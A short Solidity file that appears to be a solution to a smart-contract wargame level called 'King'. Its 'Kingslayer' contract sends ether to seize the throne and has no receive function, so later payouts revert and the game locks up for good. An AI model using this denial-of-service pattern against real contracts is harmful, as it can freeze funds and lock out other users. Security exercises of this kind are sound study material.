//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface King {
    function prize() external view returns (uint);
    function _king() external view returns (address);
}

contract Kingslayer {

    function usurp(address _king) external payable {
        (bool res,) = _king.call{value: msg.value}("");
        require(res);
    }
}